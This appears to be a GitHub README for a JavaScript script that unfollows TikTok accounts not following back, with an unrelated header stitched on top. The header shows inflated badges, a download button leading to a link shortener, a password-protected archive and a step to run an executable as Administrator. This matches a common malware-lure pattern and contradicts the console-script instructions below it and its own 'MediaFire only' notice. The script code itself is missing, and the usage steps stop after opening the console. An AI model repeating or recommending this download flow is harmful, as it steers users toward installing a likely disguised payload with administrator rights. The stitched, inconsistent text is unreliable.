<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://cutxo.com/cguqla">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

# TikTok Unfollow Non-Mutuals 🚀

> **Automatically unfollow everyone on TikTok who doesn't follow you back – while keeping your friends safe.**

## ✨ Features

- ✅ **Unfollow only non-mutuals** – people who don't follow you back.
- 🛡️ **Whitelist protection** – keep your friends safe from accidental unfollow.
- ⚡ **Fast and efficient** – works through your entire following list.
- 🎛️ **Customizable speed** – adjust delays to avoid rate-limiting.
- 🛑 **Stop anytime** – just refresh the page or close the tab.

---

## ⚠️ Disclaimer

> **Use this script at your own risk.**
>
> - Automating actions on TikTok may violate their Terms of Service.
> - Running the script too fast may trigger anti-bot measures (CAPTCHA or temporary blocks).
> - TikTok frequently updates its UI – this script may break without warning.
> - The author is not responsible for any consequences, including account restrictions.

**Recommendation:** Start with a slower speed (`PAUSE_AFTER_UNFOLLOW = 1500–2000`) and increase only after testing.

---

## 📋 How to Use

1. Open **TikTok.com** in your browser and log in.
2. Go to your profile and click on **`Following`** (the number of people you follow).
3. Press **`F12`** (or `Ctrl+Shift+I` / `Cmd+Option+I`) to open Developer Tools.
4. Click on the **`Console`** tab.
## ⚙️ Customization

At the top of the script, you'll find these variables:

```javascript
const PAUSE_AFTER_UNFOLLOW = 800;   // delay after each unfollow (ms)
const PAUSE_BETWEEN_SCROLLS = 1500; // delay after scrolling the list (ms)
const WHITELIST = ['friend1', 'friend2']; // usernames to NEVER unfollow
```

Variable	Description	Recommended values
PAUSE_AFTER_UNFOLLOW	Wait time after clicking "Unfollow"	800 (fast) – 2000 (safe)
PAUSE_BETWEEN_SCROLLS	Pause after loading more users	1000 – 2000
WHITELIST	Array of usernames to protect	e.g. ['bestie', 'mom']

## 🛑 How to Stop the Script

    Simply refresh the page (press F5).

    Or close the browser tab.

## 📊 Example Output
text

🚀 Starting unfollow of non-mutuals...
🛡️ Protected from unfollow: friend1, friend2
➡️ Unfollowing: @johndoe
✅ Unfollowed (1)
➡️ Unfollowing: @randomuser
✅ Unfollowed (2)
...
🏁 Looks like we reached the end of the list!
📊 Done! Total unfollowed: 42

## 🧠 How It Works

    Scans your Following list for users who do not have the "Mutual" badge.

    Skips users whose usernames are in the whitelist.

    Clicks the "Following" button on each non-mutual.

    Confirms the unfollow in the popup dialog.

    Scrolls down to load more users and repeats until the list ends.

## 📜 License

This project is licensed under the MIT License – see the LICENSE file for details.
## 🙏 Acknowledgements

    Inspired by various TikTok automation scripts.

    Built with ❤️ for the open-source community.

## ⭐ Show Your Support

If this script helped you clean up your TikTok following, please consider:

    ⭐ Starring this repository

    🍴 Forking it for your own improvements

    🐛 Opening an issue if something breaks

Made with ❤️ and ☕ by SouthVirginia19


---

MIT License

Copyright (c) 2026 SouthVirginia19

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
